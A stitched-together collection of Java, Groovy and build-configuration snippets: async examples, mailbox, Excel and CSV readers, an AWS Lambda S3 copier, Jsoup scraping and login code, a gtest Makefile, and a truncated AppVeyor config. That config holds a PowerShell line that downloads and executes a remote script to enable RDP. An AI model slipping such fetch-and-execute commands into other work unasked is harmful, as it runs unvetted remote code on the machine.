import java.util.concurrent.CompletableFuture;

public class CompletableFutureRunAsync {

  private void start() throws InterruptedException, ExecutionException {
    CompletableFuture<Void> completableFuture  = CompletableFuture.runAsync( () -> {
      try{
        TimeUnit.SECONDS.sleep(3);
      } catch(InterruptedException ie){
        System.out.println("InterruptedException: " + ie.getMessage());
      }
    });
    completableFuture.get();
    System.out.println("I have been sleeping: 3 seconds");
  }

  public static void main(String[] args) throws InterruptedException, ExecutionException {
    new CompletableFutureRunAsync().start();
  }

}
import java.util.concurrent.TimeUnit;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.CompletableFuture;

public class CompletableFutureSupplyAsync {

  private void start() throws InterruptedException, ExecutionException {
    CompletableFuture<String> completableFuture  = CompletableFuture.supplyAsync( () -> {
      try{
        TimeUnit.SECONDS.sleep(3);
      } catch(InterruptedException ie){
        System.out.println("InterruptedException: " + ie.getMessage());
      }
      return "3 seconds";
    }).thenApply(message -> {
      return "I have been sleeping " + message;
    });
    System.out.println(completableFuture.get());
  }

  public static void main(String[] args) throws InterruptedException, ExecutionException {
    new CompletableFutureSupplyAsync().start();
  }

}
import java.util.concurrent.TimeUnit;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.CompletableFuture;

public class CompletableFutureThenApplyAsync {

  private void start() throws InterruptedException, ExecutionException {
    CompletableFuture<Integer> completableFuture  = CompletableFuture.completedFuture(3).thenApplyAsync(wait -> {
      try{
        TimeUnit.SECONDS.sleep(wait);
      } catch(InterruptedException ie){
        System.out.println("InterruptedException: " + ie.getMessage());
      }
      return wait;
    });

    final Integer result = completableFuture.get();
    System.out.println("I have been sleeping: " + result + " seconds");
  }

  public static void main(String[] args) throws InterruptedException, ExecutionException {
    new CompletableFutureThenApplyAsync().start();
  }
}

--------------------------------------------------------------------------------------------------------
def configurationDirectory = "${System.getProperty('user.home')}/.mailboxi-reader"

buildscript {
  ext {
    springBootVersion = '1.5.1.RELEASE'
    cglibVersion = '3.2.4'
    javaMailVersion = '1.4'
    ewsJavaApiVersion = '2.0'
  }
  repositories {
    mavenCentral()
  }
  dependencies {
    classpath("org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}")
  }
}

apply plugin: "groovy"
apply plugin: "application"
apply plugin: 'org.springframework.boot'

jar {
  baseName = 'mailbox-reader'
  version = '0.0.1-SNAPSHOT'
}

sourceCompatibility = 1.8

repositories {
  mavenCentral()
}

dependencies {
  compile 'org.springframework.boot:spring-boot-starter'
  compile 'org.codehaus.groovy:groovy'
  compile "javax.mail:mail:$javaMailVersion"
  compile "com.microsoft.ews-java-api:ews-java-api:$ewsJavaApiVersion"
  testCompile 'org.springframework.boot:spring-boot-starter-test'
  testCompile 'org.spockframework:spock-spring'
  testCompile "cglib:cglib-nodep:$cglibVersion"
}

task settingEnvironment(type:Copy) {
  from configurationDirectory
  into 'src/main/resources'
  include "application.properties"
}

processResources.dependsOn "settingEnvironment"

--------------------------------------------------------------------------------------------------------

import org.springframework.stereotype.Service
import org.springframework.beans.factory.annotation.Value
import org.springframework.beans.factory.annotation.Autowired

import microsoft.exchange.webservices.data.core.ExchangeService
import microsoft.exchange.webservices.data.core.PropertySet
import microsoft.exchange.webservices.data.core.service.item.Item
import microsoft.exchange.webservices.data.core.service.folder.Folder
import microsoft.exchange.webservices.data.core.service.item.EmailMessage
import microsoft.exchange.webservices.data.credential.WebCredentials
import microsoft.exchange.webservices.data.credential.ExchangeCredentials
import microsoft.exchange.webservices.data.misc.ImpersonatedUserId
import microsoft.exchange.webservices.data.search.ItemView
import microsoft.exchange.webservices.data.search.FindItemsResults
import microsoft.exchange.webservices.data.property.complex.Mailbox
import microsoft.exchange.webservices.data.property.complex.FolderId
import microsoft.exchange.webservices.data.core.enumeration.misc.ConnectingIdType
import microsoft.exchange.webservices.data.autodiscover.IAutodiscoverRedirectionUrl
import microsoft.exchange.webservices.data.core.enumeration.property.WellKnownFolderName

import javax.annotation.PostConstruct

import com.jos.dem.mailbox.reader.service.InboxReader

import org.slf4j.Logger
import org.slf4j.LoggerFactory

@Service
class InboxReaderExchange implements InboxReader {

  private static final Integer MAX_ITEMS=50

  @Value('${ews.username}')
  String username
  @Value('${ews.password}')
  String password
  @Value('${ews.server}')
  String server
  @Value('${ews.protocol}')
  String protocol

  ExchangeService service = new ExchangeService()

  Logger log = LoggerFactory.getLogger(this.class)

  @PostConstruct
  void setup(){
    service.setUrl(new URI(server))
    ExchangeCredentials credentials = new WebCredentials(username, password)
    service.setCredentials(credentials)
    service.autodiscoverUrl(username,  new RedirectionUrlCallback(protocol))
  }

  void read(){
    Folder folder = Folder.bind(service, WellKnownFolderName.Inbox)
    FindItemsResults<Item> results = service.findItems(folder.getId(), new ItemView(MAX_ITEMS))
    for (Item item : results) {
      EmailMessage emailMessage = EmailMessage.bind(service, item.getId())
      log.info("Sender: ${emailMessage.getSender()}")
      log.info("Subject: ${emailMessage.getSubject()}")
    }
  }

}

class RedirectionUrlCallback implements IAutodiscoverRedirectionUrl {

  String protocol

  RedirectionUrlCallback(String protocol){
    this.protocol = protocol
  }
  public boolean autodiscoverRedirectionUrlValidationCallback(
    String redirectionUrl) {
    return redirectionUrl.toLowerCase().startsWith(protocol)
  }

}

username=user@gmail.com
password=secret
pop3.server=pop.gmail.com
pop3.port=995
imap.server=imap.gmail.com
imap.port=993
ews.username=user@outlook.com
ews.password=secret
ews.server=https://exchange/EWS/Exchange.asmx
ews.protocol=https://
--------------------------------------------------------------------------------------------------------
def configurationDirectory = "${System.getProperty('user.home')}/.mailbox-reader"

buildscript {
  ext {
    springBootVersion = '1.5.1.RELEASE'
    cglibVersion = '3.2.4'
    javaMailVersion = '1.4'
  }
  repositories {
    mavenCentral()
  }
  dependencies {
    classpath("org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}")
  }
}

apply plugin: "groovy"
apply plugin: "application"
apply plugin: 'org.springframework.boot'

jar {
  baseName = 'mailbox-reader'
  version = '0.0.1-SNAPSHOT'
}

sourceCompatibility = 1.8

repositories {
  mavenCentral()
}

dependencies {
  compile 'org.springframework.boot:spring-boot-starter'
  compile 'org.codehaus.groovy:groovy'
  compile "javax.mail:mail:$javaMailVersion"
  testCompile 'org.springframework.boot:spring-boot-starter-test'
  testCompile 'org.spockframework:spock-spring'
  testCompile "cglib:cglib-nodep:$cglibVersion"
}

task settingEnvironment(type:Copy) {
  from configurationDirectory
  into 'src/main/resources'
  include "application.properties"  
}

processResources.dependsOn "settingEnvironment"

package com.jos.dem.mailbox.reader.service.impl

import org.springframework.stereotype.Service
import org.springframework.beans.factory.annotation.Value
import org.springframework.beans.factory.annotation.Autowired

import javax.mail.Folder
import javax.mail.Message
import javax.mail.MessagingException
import javax.mail.NoSuchProviderException
import javax.mail.Session
import javax.mail.Store
import javax.annotation.PostConstruct

import com.jos.dem.mailbox.reader.service.InboxReader

import org.slf4j.Logger
import org.slf4j.LoggerFactory

@Service
class InboxReaderImap implements InboxReader {

  @Value('${username}')
  String username
  @Value('${password}')
  String password
  @Value('${imap.server}')
  String server
  @Value('${imap.port}')
  String port

  Properties properties = new Properties()
  Folder sentFolder
  Store store

  Logger log = LoggerFactory.getLogger(this.class)
	
  @PostConstruct
  void setup() {
  	properties.put("mail.imap.host", server);
  	properties.put("mail.imap.port", port);
  	properties.put("mail.store.protocol", "imaps");
  	Session emailSession = Session.getDefaultInstance(properties)
  	Store store = emailSession.getStore('imaps')
  	store.connect(server, username, password)
  	sentFolder = store.getFolder('[Gmail]/Sent Mail')
  	sentFolder.open(Folder.READ_ONLY)
  	log.info "Inbox Type: ${sentFolder.getType()}"
  	log.info "Folders: ${store.getDefaultFolder().list('*')}"
  }

  void read(){
  	Message[] messages = sentFolder.getMessages();
	log.info("messages.length---" + messages.length);
	for (int i = 0; i < messages.length; i++) {
	  Message message = messages[i];
	  log.info("--------------------------------")
	  log.info("Email Number " + (i + 1))
	  log.info("From: " + message.getFrom()[0])
	  log.info("Subject: " + message.getSubject())
	}
	sentFolder.close(false)
  }  
	
}

username=user@gmail.com
password=secret
pop3.server=pop.gmail.com
pop3.port=995
imap.server=imap.gmail.com
imap.port=993
--------------------------------------------------------------------------------------------------------
spring init --build=gradle --language=groovy excel-filter-reader

buildscript {
	ext {
		springBootVersion = '1.5.1.RELEASE'
		apachePoiVersion = '3.15'
		spockVersion = '1.1-groovy-2.4-rc-3'
	}
	repositories {
		mavenCentral()
	}
	dependencies {
		classpath("org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}")
	}
}

apply plugin: 'groovy'
apply plugin: 'org.springframework.boot'

jar {
	baseName = 'apache-filter-reader'
	version = '0.0.1-SNAPSHOT'
}

sourceCompatibility = 1.8

repositories {
	mavenCentral()
}


dependencies {
	compile 'org.springframework.boot:spring-boot-starter'
	compile 'org.codehaus.groovy:groovy'
	compile "org.apache.poi:poi:$apachePoiVersion"
	compile "org.apache.poi:poi-ooxml:$apachePoiVersion"
	testCompile "org.spockframework:spock-core:$spockVersion"
	testCompile 'org.springframework.boot:spring-boot-starter-test'
}

import org.apache.poi.ss.usermodel.Row
import org.apache.poi.ss.usermodel.Cell
import org.apache.poi.ss.usermodel.Sheet
import org.apache.poi.ss.usermodel.Workbook
import org.apache.poi.ss.usermodel.CellType
import org.apache.poi.xssf.usermodel.XSSFWorkbook

class ExcelFilterReader {

	List<String> readRows(Integer numberOfRows, File excelFile){
		List content = new ArrayList<ArrayList<String>>()
		List line = new ArrayList<String>()
		try{
			FileInputStream fileInputStream = new FileInputStream(excelFile)
			Workbook workbook = new XSSFWorkbook(fileInputStream)
			Sheet sheet = workbook.getSheetAt(0)

			for (Row row : sheet) {
				line = new ArrayList<String>()
				if(!isHidden(row)){
					for (Cell cell : row) {
						if (cell.getCellTypeEnum() == CellType.STRING) {
							line.add(cell.getStringCellValue())
							} else if (cell.getCellTypeEnum() == CellType.NUMERIC) {
								line.add(String.valueOf(cell.getNumericCellValue()))
							}
						}
						content.add(line)
					}
				}
		} catch(FileNotFoundException fne){
			  throw new ExcelException(fne.getMessage(), fne)
		} catch(IOException ioe){
				throw new ExcelException(ioe.getMessage(), ioe)
		}

		return content
  }

  private Boolean isHidden(Row row){
    row.getZeroHeight()
  }

}

class ExcelException extends RuntimeException {

	ExcelException(String message){
		super(message)
	}

	ExcelException(String message, Throwable cause){
		super(message, cause)
	}
	
}


import spock.lang.Specification

class ExcelFilterReaderSpec extends Specification {

  ExcelFilterReader excelReader = new ExcelFilterReader()

	void "should read filtered Excel rows"(){
		given:"Rows to read"
      Integer numberOfRows = 5
    and:"An excel file"
      File excelFile = new File("src/test/resources/input.xlsx")
    when:"We read rows"
      List<List<String>> result = excelReader.readRows(numberOfRows, excelFile)
    then:"We expect to get content"
    result.size() == 3
    result.get(0) == ['Name', 'Email', 'Ranking']
    result.get(1) == ['josdem','joseluis.delacruz@gmail.com','5.0']
    result.get(2) == ['martin','martinv@email.com','5.0']
  }	

} 
--------------------------------------------------------------------------------------------------------
lazybones create java-basic excel-reader

ext.apachePoiVersion = '3.15'
ext.groovyVersion = '2.4.8'
ext.spockVersion = '1.1-groovy-2.4-rc-3'

apply plugin: "java"
apply plugin: 'groovy'
apply plugin: "application"

repositories {
  mavenCentral()
}

dependencies {
  compile "org.apache.poi:poi:$apachePoiVersion"
  compile "org.apache.poi:poi-ooxml:$apachePoiVersion"
  testCompile "org.codehaus.groovy:groovy:$groovyVersion"
  testCompile "org.spockframework:spock-core:$spockVersion"
}

import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.FileNotFoundException;

import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Cell;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.ss.usermodel.CellType;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;

public class ExcelReader {

  List<String> readRows(Integer numberOfRows, File excelFile){
    List content = new ArrayList<ArrayList<String>>();
    List line = new ArrayList<String>();
    try{
      FileInputStream fileInputStream = new FileInputStream(excelFile);
      Workbook workbook = new XSSFWorkbook(fileInputStream);
      Sheet sheet = workbook.getSheetAt(0);

      for (Row row : sheet) {
        line = new ArrayList<String>();
        for (Cell cell : row) {
          if (cell.getCellTypeEnum() == CellType.STRING) {
            line.add(cell.getStringCellValue());
          } else if (cell.getCellTypeEnum() == CellType.NUMERIC) {
            line.add(String.valueOf(cell.getNumericCellValue()));
          }
        }
        content.add(line);
      }
    } catch(FileNotFoundException fne){
      throw new ExcelException(fne.getMessage(), fne);
    } catch(IOException ioe){
      throw new ExcelException(ioe.getMessage(), ioe);
    }

    return content;
  }

}

public class ExcelException extends RuntimeException {

  ExcelException(String message){
    super(message);
  }

  ExcelException(String message, Throwable cause){
    super(message, cause);
  }

}


import spock.lang.Specification

class ExcelReaderSpec extends Specification {

  ExcelReader excelReader = new ExcelReader()

  void "should read Excel rows"(){
    given:"Rows to read"
      Integer numberOfRows = 5
    and:"An excel file"
      File excelFile = new File("src/test/resources/input.xlsx")
    when:"We read rows"
      List<List<String>> result = excelReader.readRows(numberOfRows, excelFile)
    then:"We expect to get content"
    result.size() == 4
    result.get(0) == ['Name', 'Email', 'Ranking']
    result.get(1) == ['josdem','joseluis.delacruz@gmail.com','5.0']
    result.get(2) == ['eric','erich@email.com','5.0']
    result.get(3) == ['martin','martinv@email.com','5.0']
  }

}
--------------------------------------------------------------------------------------------------------
lazybones create java-basic csv-apache-commons

ext.apacheCSVVersion = '1.4'
ext.groovyVersion = '2.4.8'
ext.spockVersion = '1.1-groovy-2.4-rc-3'

apply plugin: "java"
apply plugin: "groovy"
apply plugin: "application"

version = '0.0.1'

task buildJar(type: Jar) {
  manifest {
    attributes 'Implementation-Title': 'Read Write an CSV file with Apache Commons',
    'Implementation-Version': version,
    'Main-Class': 'example.Application'
  }
  baseName = project.name + '-all'
  from { configurations.compile.collect { it.isDirectory() ? it : zipTree(it) } }
  with jar
}

repositories {
  mavenCentral()
}

dependencies {
  compile "org.apache.commons:commons-csv:$apacheCSVVersion"
  testCompile "org.codehaus.groovy:groovy:$groovyVersion"
  testCompile "org.spockframework:spock-core:$spockVersion"
}

import java.io.FileReader;
import java.io.IOException;
import java.util.List;
import java.util.ArrayList;

import org.apache.commons.csv.CSVFormat;
import org.apache.commons.csv.CSVRecord;

public class CsvFileReader {

  public List<List<String>> read(String path){
    List elements = new ArrayList<List<String>>();
    try{
      FileReader input = new FileReader(path);
      Iterable<CSVRecord> records = CSVFormat.TDF.withHeader("id", "name", "email").parse(input);
      for (CSVRecord record : records) {
        List<String> row = new ArrayList<String>();
        String id = record.get("id");
        String name = record.get("name");
        String email = record.get("email");
        row.add(id);
        row.add(name);
        row.add(email);
        elements.add(row);
      }
    } catch(IOException ioe){
      throw new CsvException(ioe.getMessage());
    }
    return elements;
  }

}

import java.lang.RuntimeException;

public class CsvException extends RuntimeException {

  CsvException(String message){
    super(message);
  }

}

public class Target {
  private String id;
  private String name;
  private String email;

  public void setId(String id){
    this.id = id;
  }

  public String getId(){
    return id;
  }

  public void setName(String name){
    this.name = name;
  }

  public String getName(){
    return name;
  }

  public void setEmail(String email){
    this.email = email;
  }

  public String getEmail(){
    return email;
  }

}import java.io.FileWriter;
import java.io.IOException;
import java.util.List;
import java.util.ArrayList;

import org.apache.commons.csv.CSVFormat;
import org.apache.commons.csv.CSVRecord;
import org.apache.commons.csv.CSVPrinter;

public class CsvFileWriter {

  private static final String NEW_LINE_SEPARATOR = "\n";

  public void write(List<Target> targets, String path){
    List elements = new ArrayList<List<String>>();
    try{
      FileWriter output = new FileWriter(path);
      CSVPrinter printer = CSVFormat.TDF.withHeader("id", "name", "email").withRecordSeparator(NEW_LINE_SEPARATOR).print(output);

      for(Target target: targets){
        List<String> record = new ArrayList<String>();
        record.add(target.getId());
        record.add(target.getName());
        record.add(target.getEmail());
        printer.printRecord(record);
      }

      output.flush();
      output.close();
    } catch(IOException ioe){
      throw new CsvException(ioe.getMessage());
    }
  }

}

import spock.lang.Specification;

class CsvFileReaderSpec extends Specification {

  CsvFileReader reader = new CsvFileReader()

  void "Should read csv file"(){
    given:"A path"
    String path = 'src/test/resources/csv.txt'
    when:
    def result = reader.read(path);
    then:
    result.size() == 4
    result.get(0) == ['id','name','email']
    result.get(1) == ['1','eric','erich@email.com']
    result.get(2) == ['2','martin','martinv@email.com']
    result.get(3) == ['3','josdem','josdem@email.com']
  }

}


import spock.lang.Specification;

class CsvFileWriterSpec extends Specification {

  CsvFileWriter writer = new CsvFileWriter()

  void "Should write to a csv file"(){
    given:"A path"
      String path = 'src/test/resources/csv_written.txt'
    and:"Some targets"
      Target t1 = new Target(id:'1',name:'eric',email:'erich@email.com')
      Target t2 = new Target(id:'2',name:'martin',email:'martinv@email.com')
      Target t3 = new Target(id:'3',name:'josdem',email:'josdem@email.com')
      List<Target> targets = [t1,t2,t3]
    when:
    writer.write(targets,path);
    File file = new File(path)
    then:"We expect file exist"
    List<String> lines = []
    file.eachLine { line ->
      lines << line
    }
    lines.get(0) == 'id name  email'
    lines.get(1) == '1  eric  erich@email.com'
    lines.get(2) == '2  martin  martinv@email.com'
    lines.get(3) == '3  josdem  josdem@email.com'
  }
}
--------------------------------------------------------------------------------------------------------
import java.io.File;

import org.apache.commons.configuration2.Configuration;
import org.apache.commons.configuration2.builder.fluent.Configurations;
import org.apache.commons.configuration2.ex.ConfigurationException;

public class ConfigurationLauncher {

  private void readProperties(){
    Configurations configurations = new Configurations();
    try{
      Configuration configuration = configurations.properties(new File("configuration.properties"));
      String username = configuration.getString("username");
      String password = configuration.getString("password");
      System.out.println("{username:" + username + ",password:"+ password + "}");
    } catch (ConfigurationException cex) {
      System.out.println("Error: " + cex.getMessage());
    }
  }

  public static void main(String[] args){
    new ConfigurationLauncher().readProperties();
  }
}
--------------------------------------------------------------------------------------------------------

import java.io.InputStream;
import com.amazonaws.services.lambda.runtime.events.S3Event;
import com.amazonaws.services.lambda.runtime.Context;
import com.amazonaws.services.lambda.runtime.LambdaLogger;
import com.amazonaws.services.lambda.runtime.RequestHandler;
import com.amazonaws.services.s3.model.ObjectMetadata;

public class BucketFileTransfer implements RequestHandler<S3Event, Integer> {

  @Override
  public Integer handleRequest(S3Event event, Context context) {
    LambdaLogger logger = context.getLogger();
    logger.log("STARTING to copy file");

    MetadataFileHelper metadataFileHelper = new MetadataFileHelper(event);
    String sourceBucket = metadataFileHelper.getSourceBucketName();
    String sourceKey = metadataFileHelper.getSourceBucketKey();
    String destinationBucket = metadataFileHelper.getDestinationBucketName();;
    String destinationKey = metadataFileHelper.getDestinationBucketKey();

    AWSClient awsClient = new AWSClient(sourceBucket, sourceKey);
    InputStream objectData = awsClient.getS3Object().getObjectContent();
    ObjectMetadata meta = awsClient.getS3Object().getObjectMetadata();
    awsClient.getS3Client().putObject(destinationBucket, destinationKey, objectData, meta);
    return ResultCode.OK;
  }

}

import com.amazonaws.services.lambda.runtime.events.S3Event;
import com.amazonaws.services.s3.event.S3EventNotification.S3Entity;

public class MetadataFileHelper {

  private S3Event event;

  public MetadataFileHelper(S3Event event){
    this.event = event;
  }

  private S3Entity getBucketEntity(){
    return this.event.getRecords().get(0).getS3();
  }

  public String getSourceBucketName() {
    return getBucketEntity().getBucket().getName();
  }

  public String getSourceBucketKey() {
    return getBucketEntity().getObject().getKey();
  }

  public String getDestinationBucketName() {
    return "bucket-s3-destination";
  }

  public String getDestinationBucketKey() {
    return "copied-" + getBucketEntity().getObject().getKey();
  }

}


import com.amazonaws.ClientConfiguration;
import com.amazonaws.auth.AWSCredentials;
import com.amazonaws.auth.BasicAWSCredentials;
import com.amazonaws.services.s3.AmazonS3;
import com.amazonaws.services.s3.AmazonS3Client;
import com.amazonaws.services.s3.model.S3Object;
import com.amazonaws.services.s3.model.GetObjectRequest;

public class AWSClient {

  String sourceBucket;
  String sourceKey;
  AmazonS3 s3Client;

  public AWSClient(String sourceBucket, String sourceKey){
    this.sourceBucket = sourceBucket;
    this.sourceKey = sourceKey;
    AWSCredentials credentials = new BasicAWSCredentials("Access Key ID", "Secret Access Key");
    ClientConfiguration clientConfig = new ClientConfiguration();
    this.s3Client = new AmazonS3Client(credentials, clientConfig);
  }

  public S3Object getS3Object() {
    return getS3Client().getObject(new GetObjectRequest(sourceBucket, sourceKey));
  }

  public AmazonS3 getS3Client(){
    return this.s3Client;
  }
}

aws lambda invoke \
--invocation-type Event \
--function-name s3-aws-lambda \
--region us-west-1 \
--payload file://inputfile.txt \
outputfile.txt
--------------------------------------------------------------------------------------------------------
lazybones create java-basic hello-aws-lambda

apply plugin: "java"
apply plugin: "application"

version = '0.0.1'

task buildJar(type: Jar) {
  manifest {
    attributes 'Implementation-Title': 'Hello AWS Lambda',
    'Implementation-Version': version,
    'Main-Class': 'example.Hello'
  }
  baseName = project.name + '-all'
  from { configurations.compile.collect { it.isDirectory() ? it : zipTree(it) } }
  with jar
}

repositories {
  mavenCentral()
}

dependencies {
  compile 'com.amazonaws:aws-lambda-java-core:1.1.0'
  compile 'com.amazonaws:aws-lambda-java-events:1.1.0'
}

import com.amazonaws.services.lambda.runtime.Context;
import com.amazonaws.services.lambda.runtime.RequestHandler;

public class Hello implements RequestHandler<HelloRequest, HelloResponse> {

  @Override
  public HelloResponse handleRequest(HelloRequest input, Context context) {
    return new HelloResponse(input.getInput());
  }

}

public class HelloRequest {

  private String input;

  public HelloRequest(String input) {
    this.input = input;
  }

  public HelloRequest() {
  }

  public String getInput() {
    return input;
  }

  public void setInput(String input) {
    this.input = input;
  }
}
--------------------------------------------------------------------------------------------------------
Document doc = Jsoup.connect("http://stackoverflow.com").userAgent("Mozilla").get(); for (Element e: doc.select("a.question-hyperlink")) {     System.out.println(e.attr("abs:href"));     System.out.println(e.text());     System.out.println(); }
Document doc = Jsoup.parseBodyFragment(bodyFragment);     String link = doc             .select("div > a")             .first()             .attr("href");

// load file     File inputFile = new File(filePath);     // parse file as HTML document     Document doc = Jsoup.parse(filePath, ENCODING);     // select element by <a>     Elements elements = doc.select("a");

Connection.Response loginResponse = Jsoup.connect("yourWebsite.com/loginUrl")                                         .userAgent(USER_AGENT)                                         .data("username", "yourUsername")                                         .data("password", "yourPassword")                                         .method(Method.POST)                                         .execute();

// # Constants used in this example final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"; final String LOGIN_FORM_URL = "https://github.com/login"; final String LOGIN_ACTION_URL = "https://github.com/session"; final String USERNAME = "yourUsername"; final String PASSWORD = "yourPassword"; // # Go to login page and grab cookies sent by server Connection.Response loginForm = Jsoup.connect(LOGIN_FORM_URL)                                      .method(Connection.Method.GET)                                      .userAgent(USER_AGENT)                                      .execute(); Document loginDoc = loginForm.parse(); // this is the document containing response html HashMap<String, String> cookies = new HashMap<>(loginForm.cookies()); // save the cookies to be passed on to next request // # Prepare login credentials String authToken = loginDoc.select("#login > form > div:nth-child(1) > 

input[type=\"hidden\"]:nth-child(2)")                            .first()                            .attr("value"); HashMap<String, String> formData = new HashMap<>(); formData.put("commit", "Sign in"); formData.put("utf8", "e2 9c 93"); formData.put("login", USERNAME); formData.put("password", PASSWORD); formData.put("authenticity_token", authToken); // # Now send the form for login Connection.Response homePage = Jsoup.connect(LOGIN_ACTION_URL)      .cookies(cookies)      .data(formData)      .method(Connection.Method.POST)      .userAgent(USER_AGENT)      .execute(); System.out.println(homePage.parse().html()); 

// # Constants used in this example final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"; final String LOGIN_FORM_URL = "https://github.com/login"; final String USERNAME = "yourUsername"; final String PASSWORD = "yourPassword"; // # Go to login page Connection.Response loginFormResponse = Jsoup.connect(LOGIN_FORM_URL)                                              .method(Connection.Method.GET)                                              .userAgent(USER_AGENT)                                              .execute(); // # Fill the login form // ## Find the form first... FormElement loginForm = (FormElement)loginFormResponse.parse()                                          .select("div#login > form").first(); checkElement("Login Form", loginForm); // ## ... then "type" the username ... Element loginField = loginForm.select("#login_field").first(); checkElement("Login Field", loginField); loginField.val(USERNAME); // ## ... and "type" the password Element passwordField = loginForm.select("#password").first(); checkElement("Password Field", passwordField); passwordField.val(PASSWORD); // # Now send the form for login Connection.Response loginActionResponse = loginForm.submit()          .cookies(loginFormResponse.cookies())          .userAgent(USER_AGENT)
.execute(); System.out.println(loginActionResponse.parse().html()); public static void checkElement(String name, Element elem) {     if (elem == null) {         throw new RuntimeException("Unable to find " + name);     } }

// load source from file     Document doc = Jsoup.parse(new File("page.html"), "UTF-8");     // iterate over row and col     for (Element row : doc.select("table#data > tbody > tr"))         for (Element col : row.select("td"))             // print results             System.out.println(col.ownText());

// load page using HTML Unit and fire scripts     WebClient webClient = new WebClient();     HtmlPage myPage = webClient.getPage(new File("page.html").toURI().toURL());     // convert page to generated HTML and convert to document     doc = Jsoup.parse(myPage.asXml());     // iterate row and col     for (Element row : doc.select("table#data > tbody > tr"))         for (Element col : row.select("td"))             // print results             System.out.println(col.ownText());     // clean up resources     webClient.close();

String html = "<!DOCTYPE html>" +               "<html>" +                 "<head>" +                   "<title>Hello world!</title>" +                 "</head>" +                 "<body>" +                   "<h1>Hello there!</h1>" +                   "<p>First paragraph</p>" +                   "<p class=\"not-first\">Second paragraph</p>" +                   "<p class=\"not-first third\">Third <a href=\"page.html\">paragraph</a></p>" +                 "</body>" +               "</html>";

// Parse the document Document doc = Jsoup.parse(html); // Get document title String title = doc.select("head > title").first().text(); System.out.println(title); // Hello world! Element firstParagraph = doc.select("p").first(); // Get all paragraphs except from the first Elements otherParagraphs = doc.select("p.not-first"); // Same as otherParagraphs = doc.select("p"); otherParagraphs.remove(0); // Get the third paragraph (second in the list otherParagraphs which // excludes the first paragraph) Element thirdParagraph = otherParagraphs.get(1); // Alternative: thirdParagraph = doc.select("p.third"); // You can also select within elements, e.g. anchors with a href attribute // within the third paragraph. Element link = thirdParagraph.select("a[href]"); // or the first <h1> element in the document body Element headline = doc.select("body").first().select("h1").first();
--------------------------------------------------------------------------------------------------------
# A Makefile for fusing Google Test and building a sample test against it.
#
# SYNOPSIS:
#
#   make [all]  - makes everything.
#   make TARGET - makes the given target.
#   make check  - makes everything and runs the built sample test.
#   make clean  - removes all files generated by make.

# Points to the root of fused Google Test, relative to where this file is.
FUSED_GTEST_DIR = output

# Paths to the fused gtest files.
FUSED_GTEST_H = $(FUSED_GTEST_DIR)/gtest/gtest.h
FUSED_GTEST_ALL_CC = $(FUSED_GTEST_DIR)/gtest/gtest-all.cc

# Where to find the sample test.
SAMPLE_DIR = ../../samples

# Where to find gtest_main.cc.
GTEST_MAIN_CC = ../../src/gtest_main.cc

# Flags passed to the preprocessor.
# We have no idea here whether pthreads is available in the system, so
# disable its use.
CPPFLAGS += -I$(FUSED_GTEST_DIR) -DGTEST_HAS_PTHREAD=0

# Flags passed to the C++ compiler.
CXXFLAGS += -g

all : sample1_unittest

check : all
	./sample1_unittest

clean :
	rm -rf $(FUSED_GTEST_DIR) sample1_unittest *.o

$(FUSED_GTEST_H) :
	../fuse_gtest_files.py $(FUSED_GTEST_DIR)

$(FUSED_GTEST_ALL_CC) :
	../fuse_gtest_files.py $(FUSED_GTEST_DIR)

gtest-all.o : $(FUSED_GTEST_H) $(FUSED_GTEST_ALL_CC)
	$(CXX) $(CPPFLAGS) $(CXXFLAGS) -c $(FUSED_GTEST_DIR)/gtest/gtest-all.cc

gtest_main.o : $(FUSED_GTEST_H) $(GTEST_MAIN_CC)
	$(CXX) $(CPPFLAGS) $(CXXFLAGS) -c $(GTEST_MAIN_CC)

sample1.o : $(SAMPLE_DIR)/sample1.cc $(SAMPLE_DIR)/sample1.h
	$(CXX) $(CPPFLAGS) $(CXXFLAGS) -c $(SAMPLE_DIR)/sample1.cc

sample1_unittest.o : $(SAMPLE_DIR)/sample1_unittest.cc \
                     $(SAMPLE_DIR)/sample1.h $(FUSED_GTEST_H)
	$(CXX) $(CPPFLAGS) $(CXXFLAGS) -c $(SAMPLE_DIR)/sample1_unittest.cc

sample1_unittest : sample1.o sample1_unittest.o gtest-all.o gtest_main.o
	$(CXX) $(CPPFLAGS) $(CXXFLAGS) $^ -o $@
--------------------------------------------------------------------------------------------------------
os: Visual Studio 2015

shallow_clone: true

environment:
  CONFIG: Release
  matrix:
    - BUILD: Kodi
    # - ADDONS: audiodecoder
    # - ADDONS: audioencoder
    # - ADDONS: pvr
    # - ADDONS: screensaver
    # - ADDONS: visualization

init:
  - ps: iex ((new-object net.webclient).DownloadString('https://raw.githubusercontent.com/appveyor/ci/master/scripts/enable-rdp.ps1'))

install:
  - SET PATH=C:\Program Files (x86)\CMake\bin;C:\msys64\bin;C:\msys64\usr\bin;%PATH%
  - bash -lc "pacman --needed --noconfirm -Sy"
  - mklink /j %APPVEYOR_BUILD_FOLDER%\project\BuildDependencies\msys64 C:\msys64

build_script:
  # Setup Visual Studio compiler environment
  - ps: $ErrorActionPreference= 'silentlycontinue'

  # Setup Visual Studio compiler environment
  - call "%VS140COMNTOOLS%..\..\VC\bin\vcvars32.bat"

  #
  # Build Kodi
  #
  - ps: |
      if ($env:BUILD -eq "Kodi") {
        # Download dependencies
        cd $env:APPVEYOR_BUILD_FOLDER\tools\buildsteps\windows\win32
        & .\download-dependencies.bat
        # We are using AppVeyor's already installed msys64 environment,
        # no need to install msys/mingw environment.
        # Download precompiled mingw32 libraries
        # To run make-mingwlibs.bat on AppVeyor takes too long,
        # we must use precompiled libs to speed up build
